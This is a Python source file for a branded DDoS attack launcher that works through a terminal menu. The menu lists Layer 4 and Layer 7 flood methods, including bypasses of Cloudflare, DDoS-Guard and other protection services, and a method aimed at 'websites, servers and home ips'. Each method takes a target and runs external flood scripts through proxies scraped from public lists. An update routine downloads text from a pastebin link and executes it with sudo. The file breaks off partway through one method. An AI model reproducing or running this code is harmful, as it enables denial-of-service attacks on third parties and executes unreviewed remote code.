# -*- coding: utf-8 -*-
# usr/env/bin/python3.6
import colorama
import sys
import os
import getpass
from datetime import date
import requests as r
import json
import socket
import platform
import psutil
import speedtest
import datetime
import time
s = speedtest.Speedtest()


time_now = datetime.datetime.now().strftime("%H:%M:%S")
downspeed = round((round(s.download()) / 1048576), 2)
upspeed = round((round(s.upload()) / 1048576), 2)
speedtestbaba = (f"Download speed: \n{downspeed} Mb/s\nUpload speed:\n{upspeed} Mb/s")





os.system('clear')
version = "7 \033[31mDark\033[96mness \033[31mMini"
pcnaam = "z3ntl3"
indicatorlogo = f"\033[0m\033[36m┌──\033[36m(\033[31m@\033[0m\033[31mroot\033[36m)-[\033[0m\033[39m\033[1m/home/z3ntl3\033[0m\033[36m]\n\033[36m└───\033[31m\033[1m⮞\033[0m\033[96m "
systeemnaam = getpass.getuser()
today = date.today()
d2 = today.strftime("%B %d, %Y")

developer = f"""
       \033[36m╔══════════════════════════════╗\033[0m
       \033[36m║\033[39m  Anti-Cursed \033[31mDarkness \033[39mSquad  \033[36m║\033[0m
       \033[36m║   \033[31m>  \033[39mSoftware Developer:  \033[31m<  \033[36m║\033[0m
       \033[36m║          \033[31mz3ntl3 \033[96mroot\033[36m         ║\033[0m
       \033[36m║           \033[96memp\033[31m\033[1mfaked \033[36m\033[0m          \033[36m║\033[0m
       \033[36m╚══════════════════════════════╝\033[0m


\033[31m> \033[96mVersion:\033[39m {version}"""
space = "    "
logov = f"""
{space}\033[36m    ╔═╗╔╗╔╔╦╗╦       \033[36m╔═╗╦ ╦╦═╗╔═╗╔═╗╔╦╗
{space}\033[36m    ╠═╣║║║ ║ ║  \033[31m───  \033[36m║  ║ ║╠╦╝╚═╗║╣  ║║
{space}\033[36m    ╩ ╩╝╚╝ ╩ ╩       \033[36m╚═╝╚═╝╩╚═╚═╝╚═╝═╩╝\033[0m
{space}\033[31m╔╦╗╔═╗╦═╗╦╔═\033[39m╔╗╔╔═╗╔═╗╔═╗  \033[96m╔═╗╔═╗ ╦ ╦╔═╗╔╦╗
{space}\033[31m ║║╠═╣╠╦╝╠╩╗\033[39m║║║║╣ ╚═╗╚═╗  \033[96m╚═╗║═╬╗║ ║╠═╣ ║║
{space}\033[31m═╩╝╩ ╩╩╚═╩ ╩\033[39m╝╚╝╚═╝╚═╝╚═╝  \033[96m╚═╝╚═╝╚╚═╝╩ ╩═╩╝
                  \033[31mTodays Date:\033[0m
                  {d2}
{developer}

"""
logo = f"""
{space}\033[36m    ╔═╗╔╗╔╔╦╗╦       \033[36m╔═╗╦ ╦╦═╗╔═╗╔═╗╔╦╗
{space}\033[36m    ╠═╣║║║ ║ ║  \033[31m───  \033[36m║  ║ ║╠╦╝╚═╗║╣  ║║
{space}\033[36m    ╩ ╩╝╚╝ ╩ ╩       \033[36m╚═╝╚═╝╩╚═╚═╝╚═╝═╩╝\033[0m
{space}\033[31m╔╦╗╔═╗╦═╗╦╔═\033[39m╔╗╔╔═╗╔═╗╔═╗  \033[96m╔═╗╔═╗ ╦ ╦╔═╗╔╦╗
{space}\033[31m ║║╠═╣╠╦╝╠╩╗\033[39m║║║║╣ ╚═╗╚═╗  \033[96m╚═╗║═╬╗║ ║╠═╣ ║║
{space}\033[31m═╩╝╩ ╩╩╚═╩ ╩\033[39m╝╚╝╚═╝╚═╝╚═╝  \033[96m╚═╝╚═╝╚╚═╝╩ ╩═╩╝
                        \033[31mTodays Date:\033[0m
                       {d2}
{developer}

"""
developerx = f"""
       \033[36m╔══════════════════════════════╗\033[0m
       \033[36m║\033[39m  Anti-Cursed \033[31mDarkness \033[39mSquad  \033[36m║\033[0m
       \033[36m║   \033[31m>  \033[39mSoftware Developer:  \033[31m<  \033[36m║\033[0m
       \033[36m║          \033[31mz3ntl3 \033[96mroot\033[36m         ║\033[0m
       \033[36m║           \033[96memp\033[31m\033[1mfaked \033[36m\033[0m          \033[36m║\033[0m
       \033[36m╚══════════════════════════════╝\033[0m

\033[31m> \033[96mVersion:\033[39m {version}"""
logoblocked = f"""
{space}\033[36m    ╔═╗╔╗╔╔╦╗╦       \033[36m╔═╗╦ ╦╦═╗╔═╗╔═╗╔╦╗
{space}\033[36m    ╠═╣║║║ ║ ║  \033[31m───  \033[36m║  ║ ║╠╦╝╚═╗║╣  ║║
{space}\033[36m    ╩ ╩╝╚╝ ╩ ╩       \033[36m╚═╝╚═╝╩╚═╚═╝╚═╝═╩╝\033[0m
{space}\033[31m╔╦╗╔═╗╦═╗╦╔═\033[39m╔╗╔╔═╗╔═╗╔═╗  \033[96m╔═╗╔═╗ ╦ ╦╔═╗╔╦╗
{space}\033[31m ║║╠═╣╠╦╝╠╩╗\033[39m║║║║╣ ╚═╗╚═╗  \033[96m╚═╗║═╬╗║ ║╠═╣ ║║
{space}\033[31m═╩╝╩ ╩╩╚═╩ ╩\033[39m╝╚╝╚═╝╚═╝╚═╝  \033[96m╚═╝╚═╝╚╚═╝╩ ╩═╩╝
                        \033[31mTodays Date:\033[0m
                       {d2}
{developerx}

"""



def update():
    try:
        os.system('sudo rm -r darkness')
        paste = r.get("https://pastebin.com/raw/2PJF0fqe")
        pastetext = (paste.text)
        os.system(f'{pastetext}')
        os.system('clear')
        os.system('sudo ./darkness')
    except KeyboardInterrupt:
            print('Keyboard Interruption')
            load()
            license()
            menu()
    except EOFError:
            print('EOF Error')
            load()
            license()
            menu()



def modding():
    try:
        os.system('chmod +x haven')
        os.system('chmod +x fixer')
        os.system('ulimit -n 999999')
    except KeyboardInterrupt:
        print("Keyboard Interrupt")
        load()
        license()
        menu()
    except EOFError:
        print('EOF Error')
        load()
        license()
        menu()
modding()
os.system('clear')
def proxies():
    try:

        
        os.system('sudo rm -r proxies.txt')
        crawlPROXYHTTP = r.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=7000")
        textPROXIES = (crawlPROXYHTTP.text)
        with open('proxies.txt', 'x') as file:
            file.write(str(textPROXIES))
            file.write('\n')
    except KeyboardInterrupt:
        print("Keyboard Interrupt")
        load()
        license()
        menu()
    except EOFError:
        print('EOF Error')
        load()
        license()
        menu()
    except FileExistsError:
        print("File Exist")
        os.system('sudo rm -r proxies.txt')
        load()
        license()
        menu()
proxies()
def load():
    try:
        

        os.system('clear')
        version = "7 \033[31mDark\033[96mness \033[31mMini"
        pcnaam = "z3ntl3"
        indicatorlogo = f"\033[0m\033[36m┌──\033[36m(\033[31m@\033[0m\033[31mroot\033[36m)-[\033[0m\033[39m\033[1m/home/z3ntl3\033[0m\033[36m]\n\033[36m└───\033[31m\033[1m⮞\033[0m\033[96m "
        systeemnaam = getpass.getuser()
        today = date.today()
        d2 = today.strftime("%B %d, %Y")
        developer = f"""
       \033[36m╔══════════════════════════════╗\033[0m
       \033[36m║\033[39m  Anti-Cursed \033[31mDarkness \033[39mSquad  \033[36m║\033[0m
       \033[36m║   \033[31m>  \033[39mSoftware Developer:  \033[31m<  \033[36m║\033[0m
       \033[36m║          \033[31mz3ntl3 \033[96mroot\033[36m         ║\033[0m
       \033[36m║           \033[96memp\033[31m\033[1mfaked \033[36m\033[0m          \033[36m║\033[0m
       \033[36m╚══════════════════════════════╝\033[0m

\033[31m> \033[96mVersion:\033[39m {version}"""

        space = "    "



        logo = f"""
{space}\033[36m    ╔═╗╔╗╔╔╦╗╦       \033[36m╔═╗╦ ╦╦═╗╔═╗╔═╗╔╦╗
{space}\033[36m    ╠═╣║║║ ║ ║  \033[31m───  \033[36m║  ║ ║╠╦╝╚═╗║╣  ║║
{space}\033[36m    ╩ ╩╝╚╝ ╩ ╩       \033[36m╚═╝╚═╝╩╚═╚═╝╚═╝═╩╝\033[0m
{space}\033[31m╔╦╗╔═╗╦═╗╦╔═\033[39m╔╗╔╔═╗╔═╗╔═╗  \033[96m╔═╗╔═╗ ╦ ╦╔═╗╔╦╗
{space}\033[31m ║║╠═╣╠╦╝╠╩╗\033[39m║║║║╣ ╚═╗╚═╗  \033[96m╚═╗║═╬╗║ ║╠═╣ ║║
{space}\033[31m═╩╝╩ ╩╩╚═╩ ╩\033[39m╝╚╝╚═╝╚═╝╚═╝  \033[96m╚═╝╚═╝╚╚═╝╩ ╩═╩╝
                  \033[31mTodays Date:\033[0m
                  {d2}
{developer}


\033[1m\033[31m⮞ \033[31mMethod \033[0m\033[31mDev\033[96m'\033[31ms\033[96m:\033[0m
\033[96m\033[1mMhProDev \033[0m\033[31m, \033[96mGoogleAdmin \033[31m, \033[96m Cocorisss
\033[96mEmpFaked \033[31m\033[1m, \033[96mwachirachoomsiri\033[0m \033[96m,\033[0m \033[31mLeeon123 \033[31m\033[1m& \033[0m\033[96mR00tS3c\033[0m  

"""
        logoexpired = f"""
{space}\033[36m    ╔═╗╔╗╔╔╦╗╦       \033[36m╔═╗╦ ╦╦═╗╔═╗╔═╗╔╦╗
{space}\033[36m    ╠═╣║║║ ║ ║  \033[31m───  \033[36m║  ║ ║╠╦╝╚═╗║╣  ║║
{space}\033[36m    ╩ ╩╝╚╝ ╩ ╩       \033[36m╚═╝╚═╝╩╚═╚═╝╚═╝═╩╝\033[0m
{space}\033[31m╔╦╗╔═╗╦═╗╦╔═\033[39m╔╗╔╔═╗╔═╗╔═╗  \033[96m╔═╗╔═╗ ╦ ╦╔═╗╔╦╗
{space}\033[31m ║║╠═╣╠╦╝╠╩╗\033[39m║║║║╣ ╚═╗╚═╗  \033[96m╚═╗║═╬╗║ ║╠═╣ ║║
{space}\033[31m═╩╝╩ ╩╩╚═╩ ╩\033[39m╝╚╝╚═╝╚═╝╚═╝  \033[96m╚═╝╚═╝╚╚═╝╩ ╩═╩╝
                        \033[31mTodays Date:\033[0m
                       {d2}
{developer}

\033[31m>>>\033[36m Your License is Expired or INVALID or Wrong PASSWORD

"""

        logo2 = f"""
{space}\033[36m    ╔═╗╔╗╔╔╦╗╦       \033[36m╔═╗╦ ╦╦═╗╔═╗╔═╗╔╦╗
{space}\033[36m    ╠═╣║║║ ║ ║  \033[31m───  \033[36m║  ║ ║╠╦╝╚═╗║╣  ║║
{space}\033[36m    ╩ ╩╝╚╝ ╩ ╩       \033[36m╚═╝╚═╝╩╚═╚═╝╚═╝═╩╝\033[0m
{space}\033[31m╔╦╗╔═╗╦═╗╦╔═\033[39m╔╗╔╔═╗╔═╗╔═╗  \033[96m╔═╗╔═╗ ╦ ╦╔═╗╔╦╗
{space}\033[31m ║║╠═╣╠╦╝╠╩╗\033[39m║║║║╣ ╚═╗╚═╗  \033[96m╚═╗║═╬╗║ ║╠═╣ ║║
{space}\033[31m═╩╝╩ ╩╩╚═╩ ╩\033[39m╝╚╝╚═╝╚═╝╚═╝  \033[96m╚═╝╚═╝╚╚═╝╩ ╩═╩╝
                        \033[31mTodays Date:\033[0m
                       {d2}
{developer}

\033[31m>>> \033[39m Logged in.
\033[31m>>> \033[39m CTRL + Z to STOP"""

        print(logo)
    except KeyboardInterrupt:
        print("Keyboard Interrupt")
        load()
        license()
        menu()
    except EOFError:
        print('EOF Error')
        load()
        license()
        menu()
    except FileExistsError:
        print("File Exist")
        os.system('sudo rm -r proxies.txt')
        load()
        license()
        menu()

load()


def wrongoption():
    try:
        os.system('clear')
        version = "7"
        pcnaam = "z3ntl3"
        indicatorlogo = f"\033[0m\033[36m┌──\033[36m(\033[31m@\033[0m\033[31mroot\033[36m)-[\033[0m\033[39m\033[1m/home/z3ntl3\033[0m\033[36m]\n\033[36m└───\033[31m\033[1m⮞\033[0m\033[96m "
        systeemnaam = getpass.getuser()
        today = date.today()
        d2 = today.strftime("%B %d, %Y")
        developer = f"""
              \033[36m╔══════════════════════════════╗\033[0m
              \033[36m║\033[39m  Anti-Cursed \033[31mDarkness \033[39mSquad  \033[36m║\033[0m
              \033[36m║   \033[31m>  \033[39mSoftware Developer:  \033[31m<  \033[36m║\033[0m
              \033[36m║                              ║\033[0m
              \033[36m║      \033[31mz3ntl3 \033[31mroot \033[96m(\033[31mEfdal\033[96m)\033[36m     ║\033[0m
              \033[36m╚══════════════════════════════╝\033[0m

\033[31m> \033[96mVersion:\033[39m {version}

\033[31m>\033[96mMethod developers:\033[39m 
\033[32m\033[1m# \033[0mMhProDev
\033[32m\033[1m# \033[0mR00tS3c
\033[32m\033[1m# \033[0mwachirachoomsiri
\033[32m\033[1m# \033[0mGoogleAdmin
\033[32m\033[1m# \033[0memp001
\033[32m\033[1m# \033[0mLeeon123
\033[32m\033[1m# \033[0mCocorisss

{indicatorlogo} WRONG OPTION"""
        print(str(developer))
        load()
        license()
        menu()
    except KeyboardInterrupt:
        print("Keyboard Interrupt")
        load()
        license()
        menu()
    except EOFError:
        print('EOF Error')
        load()
        license()
        menu()
    except FileExistsError:
        print("File Exist")
        os.system('sudo rm -r proxies.txt')
        load()
        license()
        menu()    

def tip():
    try:
        print(
        "\033[1m\033[31m> \033[0m\033[96mAttack Started\033[31m CTRL + C to go back Menu")
        print(
        f"\033[1m\033[31m> \033[0m\033[96mVPS Speed:\033[31m {speedtestbaba}")
    except KeyboardInterrupt:
        print("Keyboard Interrupt")
        load()
        license()
        menu()
    except EOFError:
        print('EOF Error')
        load()
        license()
        menu()
    except FileExistsError:
        print("File Exist")
        os.system('sudo rm -r proxies.txt')
        load()
        license()
        menu()
# lisans sistemi
def license():
    try:
        while True:
            licensiesystem = (r.get("https://pastebin.com/raw/hQqhhp9X").text)
            if licensiesystem == "valid":
                print(f"\033[0m\033[36m┌──\033[36m(\033[31m@root\033[0m\033[31m\033[36m)-[\033[0m\033[39m\033[1m/home/z3ntl3\033[0m\033[36m]\n\033[36m└───\033[31m⮞\033[42m\033[0m\033[96m License: Valid \033[31m[\033[32m\033[1mOnline\033[0m\033[31m] \033[31m+ \033[96mProxies Updated\033[31m!")
                break
            else:
                print(f"\033[0m\033[36m┌──\033[36m(\033[@root\033[0m\033[\033[36m)-[\033[0m\033[39m\033[1m/home/z3ntl3\033[0m\033[36m]\n\033[36m└───\033[31m⮞\033[42m\033[0m\033[96m License: \033[31m[\033[96m\033[1mOffline\033[0m\033[31m]")
                sys.exit()
    except KeyboardInterrupt:
            print('Keyboard Interruption')
            load()
            license()
            menu()
    except EOFError:
            print('EOF Error')
            load()
            license()
            menu()


license()
def methods():
    try:
        print("""\033[31m[\033[96mTools\033[31m]\033[0m
\033[31m⮞ \033[96mfixer 
\033[31m⮞ \033[96mupdate
\033[31m⮞ \033[96mproxy-crawl

\033[31m[\033[96mLayer 4\033[31m]\033[0m
\033[31m⮞ \033[96mhaven-god

\033[31m[\033[96mLayer7\033[31m]\033[0m
\033[31m⮞ \033[96mhttp-flood
\033[31m⮞ \033[96mmh-null
\033[31m⮞ \033[96mmh-get
\033[31m⮞ \033[96mmh-post
\033[31m⮞ \033[96mmh-dyn
\033[31m⮞ \033[96mmh-even
\033[31m⮞ \033[96mmh-ddosguard
\033[31m⮞ \033[96mmh-arvancloud
\033[31m⮞ \033[96mmh-normalbypass
\033[31m⮞ \033[96mmh-projectshield
\033[31m⮞ \033[96mmh-cfbypass
\033[31m⮞ \033[96multra-bypass
\033[31m⮞ \033[96mnuker-proxyless
\033[31m⮞ \033[96mnuker-proxied
\033[31m⮞ \033[96mhttp-raw

\033[31m\033[1m⮞ \033[0m\033[96mback
""")
    except KeyboardInterrupt:
            print('Keyboard Interruption')
            load()
            license()
            menu()
    except EOFError:
            print('EOF Error')
            load()
            license()
            menu()

def menu():
    print('\n\033[31m\033[1m> \033[96m Type \033[31mmenu \033[96m to view \033[31mattack\033[96m commands\033[31m!\033[96m')
    try:
        kies = input('\n' + indicatorlogo)
    except KeyboardInterrupt:
            print('Keyboard Interruption')
            load()
            license()
            menu()
    except EOFError:
            print('EOF Error')
            load()
            license()
            menu()
    try:
        while True:

            if kies == "menu":
                os.system('clear')
                print(logov)
                methods()
                menuoption = input("\n" + indicatorlogo)
                if menuoption == "exit":
                    sys.exit()
                
                if menuoption == "back":
                    load()
                    license()
                    menu()
                if menuoption == "fixer":
                    os.system('./fixer')
                    
                if menuoption == "update":
                    update()
                if menuoption == "proxy-crawl":
                    os.system('clear')
                    load()
                    print("""
\033[36m[\033[39mTOOLS.x\033[36m]\033[0m

\033[31m\033[1m>\033[0m \033[39mproxy-crawl \033[31m: \033[36m crawl proxies\033[31m[\033[32mRUNNING\033[31m]\033[0m
\033[31m\033[1m>\033[0m \033[39m Option 1: \033[96mProxy Scraper IO Proxies\033[0m
\033[31m\033[1m>\033[0m \033[39m Option 2: \033[96mProxy List Proxies\033[0m


    """)
                    qbro = input("\033[31m\033[1m>\033[0m \033[96mChoose from the options\033[31m\033[1m:\033[0m\033[96m  ")
                    if qbro == "1":
                        os.system('sudo rm -r proxies.txt')
                        crawlPROXYHTTP = r.get(f"https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=7000")
                        textPROXIES = (crawlPROXYHTTP.text)
                        with open('proxies.txt', 'x') as file:
                            file.write(str(textPROXIES))
                            file.write('\n')
                            print(indicatorlogo + "Proxies saved in = proxies.txt\n\n")
                            gobackMENU = input(indicatorlogo + "Go back to menu (y/n):")
                            if gobackMENU == "n":
                                sys.exit()
                            else:
                                load()
                                license()
                                menu()
                    if qbro == "2":
                        os.system('sudo rm -r proxies.txt')
                        crawlPROXYHTTP = r.get(f"https://www.proxy-list.download/api/v1/get?type=http")
                        textPROXIES = (crawlPROXYHTTP.text)
                        with open('proxies.txt', 'x') as file:
                            file.write(str(textPROXIES))
                            file.write('\n')
                            print(indicatorlogo + "Proxies saved in = proxies.txt\n\n")
                            gobackMENU = input(indicatorlogo + "Go back to menu (y/n):")
                            if gobackMENU == "n":
                                sys.exit()
                            else:
                                load()
                                license()
                                menu()

                if menuoption == "mh-normalbypass":
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-normalbypass \033[31m: \033[36m Powerfull Layer 7 Attack: Bypass normal anti ddos \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                    mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                    mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                    mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                    mhgetsend = ('python3 start.py bypass ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                    tip()
                    
                    os.system(mhgetsend)
                    load()
                    license()
                    menu()
                if menuoption == "mh-cfbypass":
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-cfbypass \033[31m: \033[36m Powerfull Layer 7 Attack: Bypass CLOUDFLARE \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                    mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                    mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                    mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                    mhgetsend = ('python3 start.py cfb ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                    tip()
                    
                    os.system(mhgetsend)
                    
                    load()
                    license()
                    menu()
                if menuoption == "mh-ddosguard":
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-ddosguard \033[31m: \033[36m Powerfull Layer 7 Attack: Bypass DDOS GUARD \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                    mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                    mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                    mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                    mhgetsend = ('python3 start.py dgb ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                    tip()
                    
                    os.system(mhgetsend)
                    
                    load()
                    license()
                    menu()
                if menuoption == "mh-arvancloud":
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-arvancloud \033[31m: \033[36m Powerfull Layer 7 Attack: Bypass ARVAN CLOUD \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                    mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                    mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                    mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                    mhgetsend = ('python3 start.py avb ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                    tip()
                    
                    os.system(mhgetsend)
                    
                    load()
                    license()
                    menu()
                if menuoption == "mh-projectshield":
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-projectshield \033[31m: \033[36m Powerfull Layer 7 Attack: Bypass PROJECT SHIELD \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                    mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                    mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                    mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                    mhgetsend = ('python3 start.py gsb ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                    tip()
                    
                    os.system(mhgetsend)
                    
                    load()
                    license()
                    menu()
                if menuoption == "mh-even":
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-even \033[31m: \033[36m Powerfull Layer 7 Attack: EVEN \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                    mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                    mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                    mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                    mhgetsend = ('python3 start.py even ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                    tip()
                    
                    
                    os.system(mhgetsend)
                    
                    load()
                    license()
                    menu()
                if menuoption == "mh-get":
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-get \033[31m: \033[36m Powerfull Layer 7 Attack: GET \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                    mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                    mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                    mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                    mhgetsend = ('python3 start.py get ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                    tip()
                    
                    os.system(mhgetsend)
                    
                    load()
                    license()
                    menu()
                if menuoption == "mh-post":
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-post \033[31m: \033[36m Powerfull Layer 7 Attack: POST\033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                    mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                    mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                    mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                    mhgetsend = ('python3 start.py post ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                    tip()
                    
                    os.system(mhgetsend)
                    
                    load()
                    license()
                    menu()
                if menuoption == "mh-dyn":
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-dyn \033[31m: \033[36m Powerfull Layer 7 Attack: DYN \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                    mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                    mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                    mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                    mhgetsend = ('python3 start.py dyn ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                    tip()
                    
                    os.system(mhgetsend)
                    
                    load()
                    license()
                    menu()
                if menuoption == "mh-null":
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-null \033[31m: \033[36m Powerfull Layer 7 Attack: NULL \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                    mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                    mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                    mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                    mhgetsend = ('python3 start.py null ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                    tip()
                   
                    os.system(mhgetsend)
                   
                    load()
                    license()
                    menu()
                if menuoption == "haven-god":
                    os.system('clear')
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mhaven-god \033[31m: \033[36m Verry strong Layer 4 attack for websites, servers and home ips \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    havenip = input("\033[31m\033[1m⮞ \033[0m\033[96mIP\033[31m:\033[36m\033[31m")
                    havensend = ('sudo ./haven -d ' + havenip)
                    tip()
                    
                    os.system(havensend)
                    
                    load()
                    license()
                    menu()

                if menuoption == "udp-god":
                    os.system('clear')
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mudp-god \033[31m: \033[36m Strong Layer 4 Attack \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    udpIP = input("\033[31m\033[1m⮞ \033[0m\033[96mIP\033[31m:\033[36m\033[31m")
                    udpTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m")
                    sendUDP = (f'perl cocorisss.pl {udpIP} {udpTIME}')
                    tip()
                    os.system(sendUDP)
                    load()
                    license()
                    menu()
                if menuoption == "ultra-bypass":
                    os.system('clear')
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39multra-bypass \033[31m: \033[36m Bypasses Blazingfast, DDOS Guard, (js) StormWall , OVH UAM & Cloudflare UAM & Also normal hit could be done \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    ultrabypasswebsite = input("\033[31m\033[1m⮞ \033[0m\033[96mWEBSITE (https://google.com) \033[31m:\033[36m\033[31m")
                    ultrabypasstime = input("\033[31m\033[1m⮞ \033[0m\033[96mTIME(seconds) \033[31m:\033[36m\033[31m")
